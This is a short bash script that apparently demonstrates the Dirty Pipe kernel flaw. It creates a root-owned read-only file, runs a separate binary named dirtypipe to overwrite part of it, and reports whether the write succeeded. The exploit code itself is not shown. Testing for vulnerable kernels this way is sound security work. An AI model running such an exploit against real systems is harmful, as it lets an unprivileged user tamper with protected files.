#!/bin/bash

ROFILE=read_only_file.txt

echo "[*] Creating read_only_file.txt..."

if [ -f $ROFILE ]; then
    sudo rm $ROFILE
fi

sudo echo "This is a read only file..." > $ROFILE
sudo chown root:root $ROFILE
sudo chmod 444 $ROFILE

read -n1 -p "[*] Press any key to continue..."

echo "[*] Running exploit..."
./bin/dirtypipe $ROFILE 20 "exploit"

cat $ROFILE | grep exploit > /dev/null

if [ $? -eq 0 ]; then
    echo "[*] Exploit was successful!"
else
    echo "[!] Exploit was not successful!"
fi